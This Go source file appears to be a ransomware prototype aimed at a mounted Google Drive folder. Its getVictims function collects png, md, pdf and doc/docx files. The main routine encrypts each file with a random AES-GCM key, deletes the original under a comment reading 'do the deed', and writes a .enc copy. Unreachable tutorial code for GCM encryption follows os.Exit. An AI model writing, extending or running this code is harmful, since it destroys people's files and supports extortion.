package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	b64 "encoding/base64"
	"fmt"
	"io"
	"io/ioutil"
	"os"
	"path/filepath"
	"strings"
)

var extensions []string = []string{
	"png",
	"md",
	"pdf",
	"doc",
	"docx",
}

func getVictims() []string {
	var files []string
	root := "/Volumes/GoogleDrive/My Drive/"
	err := filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
		if !info.IsDir() {
			parts := strings.Split(path, ".")
			for _, p := range extensions {
				if strings.Contains(p, parts[len(parts)-1]) {
					files = append(files, path)
					break
				}
			}
		}
		return nil
	})

	if err != nil {
		fmt.Printf("Could not walk the %s because %s\n", root, err.Error())
	}

	return files
}

func main() {

	key := make([]byte, 32)
	if _, err := io.ReadFull(rand.Reader, key); err != nil {
		fmt.Printf("Could not create Key because %s\n", err)
		os.Exit(2)
	}
	fmt.Printf("Encryption Key: %s\n", b64.StdEncoding.EncodeToString(key))

	// make aad for the cipher, 16 bytes of random
	aad := make([]byte, 16)
	if _, err := io.ReadFull(rand.Reader, aad); err != nil {
		fmt.Printf("Could not create AAD because %s\n", err)
		os.Exit(1)
	}
	fmt.Printf("AAD: %s\n", b64.StdEncoding.EncodeToString(aad))

	targets := getVictims()

	for _, t := range targets {
		pt, err := ioutil.ReadFile(t)
		if err != nil {
			fmt.Printf("Couldnt read %s because of %s\n", t, err.Error())
			continue
		}

		c, err := aes.NewCipher(key)
		if err != nil {
			fmt.Printf("Could not initialize cipher with key because %s\n", err.Error())
			continue
		}

		gcm, err := cipher.NewGCM(c)
		if err != nil {
			fmt.Printf("Could not initialize GCM mode because %s\n", err.Error())
			continue
		}

		// gen random IV (nonce)
		iv := make([]byte, gcm.NonceSize())
		if _, err := io.ReadFull(rand.Reader, iv); err != nil {
			fmt.Printf("Could not create random IV because %s\n", err)
			continue
		}

		ct := gcm.Seal(iv, iv, pt, aad)

		// write out to tmp to start for now.
		/* unit tests
		parts := strings.Split(t, "/")
		filename := parts[len(parts)-1]

		err = ioutil.WriteFile(fmt.Sprintf("/tmp/tmp/%s.enc", filename), ct, 0600)
		*/

		// do the deed
		os.Remove(t)
		err = ioutil.WriteFile(fmt.Sprintf("%s.enc", t), ct, 0600)

		if err != nil {
			fmt.Printf("Could not write out encrypted file because %s\n", err.Error())
		}

		// verify decryption
		_iv := ct[:gcm.NonceSize()]
		_ct := ct[gcm.NonceSize():]

		_, err = gcm.Open(nil, _iv, _ct, aad)

		if err != nil {
			fmt.Printf("Could not verify via decryption because of %s\n", err.Error())
		}

		// fmt.Printf("%s\n\tPT length: %d\n\tCT length: %d\n\tVT length: %d\n", t, len(pt), len(ct), len(_pt))
	}

	os.Exit(0)

	//
	// Example code
	//
	// generate a new aes cipher using our 32 byte long key
	text := []byte("My Super Secret Code Stuff")
	key = []byte("passphrasewhichneedstobe32bytes!")

	c, err := aes.NewCipher(key)
	// if there are any errors, handle them
	if err != nil {
		fmt.Println(err)
	}

	// gcm or Galois/Counter Mode, is a mode of operation
	// for symmetric key cryptographic block ciphers
	// - https://en.wikipedia.org/wiki/Galois/Counter_Mode
	gcm, err := cipher.NewGCM(c)
	// if any error generating new GCM
	// handle them
	if err != nil {
		fmt.Println(err)
	}

	// creates a new byte array the size of the nonce
	// which must be passed to Seal
	nonce := make([]byte, gcm.NonceSize())
	// populates our nonce with a cryptographically secure
	// random sequence
	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
		fmt.Println(err)
	}

	// here we encrypt our text using the Seal function
	// Seal encrypts and authenticates plaintext, authenticates the
	// additional data and appends the result to dst, returning the updated
	// slice. The nonce must be NonceSize() bytes long and unique for all
	// time, for a given key.
	fmt.Println(gcm.Seal(nonce, nonce, text, nil))
}
